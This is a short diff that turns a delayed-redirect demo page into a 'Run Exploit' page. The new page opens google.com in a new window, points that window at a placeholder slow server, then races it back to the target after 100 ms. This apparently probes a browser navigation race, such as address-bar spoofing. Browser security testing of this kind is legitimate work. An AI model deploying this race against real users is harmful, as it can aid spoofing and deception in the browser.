@@ -1,20 +1,25 @@
 <!doctype html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
 <body>
 
-<h2>Redirect with Delayed Response</h2>
-
-<button onclick="run()">Run</button>
+<button onclick="run()">Run Exploit</button>
 
 <script>
-const SERVER = "https://ajaone.github.io/testing-repository/test/17.php";
+const TARGET = "https://www.google.com";
+const SERVER = "https://your-server/slow.php?s=10";
 
 function run() {
-  const delay = 10; // seconds
-  window.location = SERVER + "?s=" + delay;
+  const w = window.open(TARGET);
+
+  setTimeout(() => {
+    w.location.href = SERVER;
+
+    // race balik ke target
+    setTimeout(() => {
+      w.location.href = TARGET;
+    }, 100);
+
+  }, 1000);
 }
 </script>
 
